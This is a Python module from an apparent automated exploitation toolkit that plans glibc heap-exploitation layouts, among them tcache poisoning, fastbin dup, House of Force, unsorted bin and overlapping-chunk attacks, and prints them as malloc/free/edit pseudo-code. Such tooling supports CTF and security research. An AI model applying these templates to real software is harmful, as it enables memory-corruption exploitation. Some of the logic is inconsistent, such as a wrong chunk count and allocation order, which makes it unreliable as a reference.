"""
Heap feng shui and layout manipulation.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from autopwn.utils.helpers import p64, p32
from autopwn.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class HeapChunkSpec:
    """Specification for a heap chunk."""
    size: int
    data: bytes = b""
    index: int = 0  # Allocation order
    should_free: bool = False
    name: str = ""


@dataclass
class HeapLayout:
    """
    Represents desired heap layout for exploitation.
    """
    chunks: List[HeapChunkSpec] = field(default_factory=list)
    operations: List[Tuple[str, int]] = field(default_factory=list)  # (op, chunk_idx)

    # Target positions
    target_offset: int = 0  # Offset from known chunk
    victim_index: int = 0   # Index of victim chunk


class HeapLayoutBuilder:
    """
    Build heap layouts for exploitation.

    Helps construct the precise heap state needed for various attacks.
    """

    def __init__(self, bits: int = 64):
        """
        Initialize layout builder.

        Args:
            bits: Architecture bits (32 or 64)
        """
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self._layout = HeapLayout()
        self._chunk_counter = 0

    def add_chunk(
        self,
        size: int,
        data: bytes = b"",
        name: str = "",
    ) -> int:
        """
        Add chunk allocation to layout.

        Args:
            size: Allocation size
            data: Initial data
            name: Chunk identifier

        Returns:
            Chunk index
        """
        idx = self._chunk_counter
        self._chunk_counter += 1

        chunk = HeapChunkSpec(
            size=size,
            data=data,
            index=idx,
            name=name or f"chunk_{idx}",
        )
        self._layout.chunks.append(chunk)
        self._layout.operations.append(("alloc", idx))

        return idx

    def free_chunk(self, index: int) -> None:
        """
        Add chunk free to layout.

        Args:
            index: Chunk index to free
        """
        for chunk in self._layout.chunks:
            if chunk.index == index:
                chunk.should_free = True
                break
        self._layout.operations.append(("free", index))

    def edit_chunk(self, index: int, data: bytes) -> None:
        """
        Add chunk edit to layout.

        Args:
            index: Chunk index to edit
            data: New data
        """
        for chunk in self._layout.chunks:
            if chunk.index == index:
                chunk.data = data
                break
        self._layout.operations.append(("edit", index))

    def build_tcache_attack(
        self,
        target_addr: int,
        chunk_size: int = 0x20,
    ) -> HeapLayout:
        """
        Build layout for tcache poisoning attack.

        Args:
            target_addr: Target allocation address
            chunk_size: Chunk size for tcache bin

        Returns:
            HeapLayout for attack
        """
        self._layout = HeapLayout()
        self._chunk_counter = 0

        # Allocate two chunks
        a = self.add_chunk(chunk_size, name="A")
        b = self.add_chunk(chunk_size, name="B")

        # Free both to tcache
        self.free_chunk(a)
        self.free_chunk(b)

        # Edit freed chunk A to overwrite fd
        self.edit_chunk(a, self.pack(target_addr))

        # Allocate to get target
        self.add_chunk(chunk_size, name="get_A")
        self.add_chunk(chunk_size, name="target")

        self._layout.target_offset = chunk_size * 2
        self._layout.victim_index = a

        return self._layout

    def build_fastbin_dup(
        self,
        target_addr: int,
        chunk_size: int = 0x20,
    ) -> HeapLayout:
        """
        Build layout for fastbin dup attack.

        Args:
            target_addr: Target allocation address
            chunk_size: Chunk size for fastbin

        Returns:
            HeapLayout for attack
        """
        self._layout = HeapLayout()
        self._chunk_counter = 0

        # Allocate three chunks
        a = self.add_chunk(chunk_size, name="A")
        b = self.add_chunk(chunk_size, name="B")

        # Double free: free(a), free(b), free(a)
        self.free_chunk(a)
        self.free_chunk(b)
        self.free_chunk(a)  # Double free!

        # Allocate and overwrite fd
        c = self.add_chunk(chunk_size, data=self.pack(target_addr), name="overwrite")

        # Allocate through to target
        self.add_chunk(chunk_size, name="get_B")
        self.add_chunk(chunk_size, name="get_A")
        self.add_chunk(chunk_size, name="target")

        self._layout.target_offset = chunk_size * 3
        self._layout.victim_index = a

        return self._layout

    def build_house_of_force(
        self,
        target_addr: int,
        current_top: int,
    ) -> HeapLayout:
        """
        Build layout for House of Force.

        Args:
            target_addr: Target allocation address
            current_top: Current top chunk address

        Returns:
            HeapLayout for attack
        """
        self._layout = HeapLayout()
        self._chunk_counter = 0

        # Allocate chunk to overflow into top
        header_size = 16 if self.bits == 64 else 8

        # Overflow payload: padding + giant size
        overflow_size = 0x20  # Adjust based on vulnerability
        overflow_data = b"A" * (overflow_size - header_size)
        overflow_data += self.pack(0xFFFFFFFFFFFFFFFF if self.bits == 64 else 0xFFFFFFFF)

        overflow = self.add_chunk(overflow_size, data=overflow_data, name="overflow")

        # Calculate evil allocation size
        evil_size = target_addr - current_top - header_size * 2

        # Evil allocation moves top
        evil = self.add_chunk(evil_size, name="evil")

        # Next allocation is at target
        target = self.add_chunk(0x100, name="target")

        self._layout.target_offset = evil_size + header_size

        return self._layout

    def build_unsorted_bin_attack(
        self,
        target_addr: int,
        chunk_size: int = 0x100,
    ) -> HeapLayout:
        """
        Build layout for unsorted bin attack.

        Args:
            target_addr: Where to write main_arena pointer
            chunk_size: Chunk size (must be > 0x80 for unsorted)

        Returns:
            HeapLayout for attack
        """
        self._layout = HeapLayout()
        self._chunk_counter = 0

        # Ensure chunk goes to unsorted bin (not tcache/fastbin)
        if chunk_size <= 0x80:
            chunk_size = 0x100

        # Allocate victim and guard (prevent consolidation)
        victim = self.add_chunk(chunk_size, name="victim")
        guard = self.add_chunk(0x20, name="guard")

        # Free victim to unsorted bin
        self.free_chunk(victim)

        # Edit to overwrite bk pointer
        # bk should point to target - 0x10 (offset to fd)
        self.edit_chunk(victim, b"A" * 8 + self.pack(target_addr - 0x10))

        # Trigger write with allocation
        self.add_chunk(chunk_size, name="trigger")

        self._layout.target_offset = 0
        self._layout.victim_index = victim

        return self._layout

    def build_overlapping_chunks(
        self,
        overlap_size: int = 0x50,
    ) -> HeapLayout:
        """
        Build layout for overlapping chunk attack.

        Args:
            overlap_size: Size of overlap

        Returns:
            HeapLayout with overlapping chunks
        """
        self._layout = HeapLayout()
        self._chunk_counter = 0

        # Allocate chunks
        a = self.add_chunk(0x100, name="A")
        b = self.add_chunk(0x30, name="B_victim")
        c = self.add_chunk(0x100, name="C")
        guard = self.add_chunk(0x20, name="guard")

        # Free A (goes to unsorted)
        self.free_chunk(a)

        # Overflow in B to modify C's prev_size and clear PREV_INUSE
        # This would require specific vulnerability

        # Free C triggers backward consolidation over B
        self.free_chunk(c)

        # New allocation overlaps with B
        overlapper = self.add_chunk(0x100 + 0x30, name="overlapper")

        self._layout.victim_index = b

        return self._layout

    def get_layout(self) -> HeapLayout:
        """Get current layout."""
        return self._layout

    def get_operations_script(self) -> str:
        """
        Generate pseudo-code for heap operations.

        Returns:
            Script string
        """
        lines = ["# Heap layout operations"]

        chunks_created = {}

        for op, idx in self._layout.operations:
            chunk = next(
                (c for c in self._layout.chunks if c.index == idx),
                None
            )

            if op == "alloc":
                if chunk:
                    data_hex = chunk.data.hex() if chunk.data else ""
                    lines.append(
                        f"{chunk.name} = malloc(0x{chunk.size:x})  # idx={idx}"
                    )
                    if data_hex:
                        lines.append(f"write({chunk.name}, bytes.fromhex('{data_hex}'))")
                    chunks_created[idx] = chunk.name

            elif op == "free":
                name = chunks_created.get(idx, f"chunk_{idx}")
                lines.append(f"free({name})  # idx={idx}")

            elif op == "edit":
                name = chunks_created.get(idx, f"chunk_{idx}")
                if chunk and chunk.data:
                    lines.append(
                        f"edit({name}, bytes.fromhex('{chunk.data.hex()}'))"
                    )

        return "\n".join(lines)

    def summary(self) -> str:
        """Get layout summary."""
        return f"""
Heap Layout
===========
Chunks: {len(self._layout.chunks)}
Operations: {len(self._layout.operations)}

{self.get_operations_script()}
"""
